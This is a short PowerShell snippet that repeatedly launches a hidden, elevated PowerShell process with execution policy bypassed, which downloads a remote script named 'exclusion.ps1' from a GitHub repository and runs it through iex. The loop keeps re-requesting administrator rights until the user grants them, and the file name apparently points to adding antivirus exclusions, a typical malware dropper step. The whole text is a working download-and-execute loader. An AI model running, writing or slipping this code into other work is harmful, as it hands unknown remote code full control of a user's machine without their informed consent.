do {
    try {
        Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "irm https://github.com/m4x7c/win11lude/raw/refs/heads/main/exclusion.ps1 | iex"' -Verb RunAs
        $success = $true
    } catch {
        $success = $false
    }
} until ($success)
